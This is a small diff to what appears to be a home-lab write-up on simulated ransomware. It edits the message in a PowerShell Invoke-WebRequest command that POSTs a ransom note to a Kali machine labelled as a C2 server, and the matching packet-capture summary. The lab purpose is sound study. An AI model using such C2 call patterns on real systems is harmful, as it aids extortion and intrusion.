@@ -23,7 +23,7 @@ Get-ChildItem -Path C:\Data -Recurse | ForEach-Object {
 We used `Invoke-WebRequest` to simulate sending a ransom note back to a Command & Control (C2) server:
 
 ```powershell
-Invoke-WebRequest -Uri http://192.168.2.131:8080/ransom_note.txt -Method POST -Body "Pay up!"
+Invoke-WebRequest -Uri http://192.168.2.131:8080/ransom_note.txt -Method POST -Body "Pay up"
 ```
 
 📷 **PowerShell Output:**
@@ -72,7 +72,7 @@ This revealed:
 - **Source IP:** 192.168.2.129 (Windows victim)
 - **Destination IP:** 192.168.2.131:8080 (Kali C2)
 - **Protocol:** HTTP POST
-- **Payload:** `Pay up!`
+- **Payload:** `Pay up`
 
 ---
 
